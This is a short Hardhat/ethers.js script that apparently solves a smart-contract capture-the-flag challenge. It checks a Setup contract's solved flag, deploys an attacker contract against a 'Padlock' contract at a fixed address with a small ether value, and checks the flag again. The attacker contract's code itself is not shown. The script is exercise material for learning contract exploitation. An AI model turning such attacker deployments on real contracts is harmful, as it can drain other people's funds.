const { parseEther } = require("ethers/lib/utils");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("BowTiedPickleAttacker");

  const setup = await ethers.getContractAt( "Setup", "0xfF2c41d306098Ce69316C781137EaF05FABDFF6b" );
  const ctf = await ethers.getContractAt( "Padlock", "0xF8e8370A8d0a840DB47B2d52BEe5C549aD04809a" );

  console.log("solved:", await setup.isSolved());

  await EXPLOIT.deploy(ctf.address, { value: 33 });

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
